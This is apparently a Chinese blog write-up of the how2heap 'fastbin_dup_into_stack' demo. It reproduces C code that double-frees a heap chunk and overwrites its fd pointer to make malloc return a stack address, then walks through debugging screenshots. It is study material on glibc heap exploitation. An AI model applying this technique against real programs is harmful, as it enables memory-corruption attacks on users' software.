---
title: fastbin_dup_into_stack
date: 2020-08-12 14:19:09
updated: 2020-08-12 14:19:09
tags:
    - heap
    - pwn
    - fastbin_dup_into_stack
categories: 
	- 二进制安全
	- how2heap
use:
  - Valine
text: true
lazyload: true
count: true
---

# 源码

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
           "returning a pointer to a controlled location (in this case, the stack).\n");

    unsigned long long stack_var;

    fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

    fprintf(stderr, "Allocating 3 buffers.\n");
    int *a = malloc(8);
    int *b = malloc(8);
    int *c = malloc(8);

    fprintf(stderr, "1st malloc(8): %p\n", a);
    fprintf(stderr, "2nd malloc(8): %p\n", b);
    fprintf(stderr, "3rd malloc(8): %p\n", c);

    fprintf(stderr, "Freeing the first one...\n");
    free(a);

    fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
    // free(a);

    fprintf(stderr, "So, instead, we'll free %p.\n", b);
    free(b);

    fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
    free(a);

    fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
        "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
    unsigned long long *d = malloc(8);

    fprintf(stderr, "1st malloc(8): %p\n", d);
    fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
    fprintf(stderr, "Now the free list has [ %p ].\n", a);
    fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
        "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
        "so that malloc will think there is a free chunk there and agree to\n"
        "return a pointer to it.\n", a);
    stack_var = 0x20;

    fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

    fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
    fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```

# 运行结果

![image.png](https://i.loli.net/2020/11/17/joE9uIbgskQApXV.png)

# 分析&调试

前面的操作和fastbin_dup一样，之后

先malloc给了d，之后malloc（8）

之后freelist上还有a，和d指向的是同一块chunk

之后使用d修改chunk的fd指针指向栈上，那么再次malloc*2的时候就会malloc到栈上

调试：

malloc三次后：

![image.png](https://i.loli.net/2020/11/17/D26tuZAIzSoL817.png)

free三次后：

![image.png](https://i.loli.net/2020/11/17/2aFMSuhi7rWtw5Y.png)

malloc给d后，malloc(8)，之后声明了一个栈上变量为20：

![image.png](https://i.loli.net/2020/11/17/JPN3Qdugq5atYBK.png)

修改d的值为栈上地址后：

成功将栈链入fastbin

![image.png](https://i.loli.net/2020/11/17/Gl3ByUiALDEqMt9.png)

# 总结

- 为什么栈上变量是20？因为要伪造fastbin的chunk大小（会检查）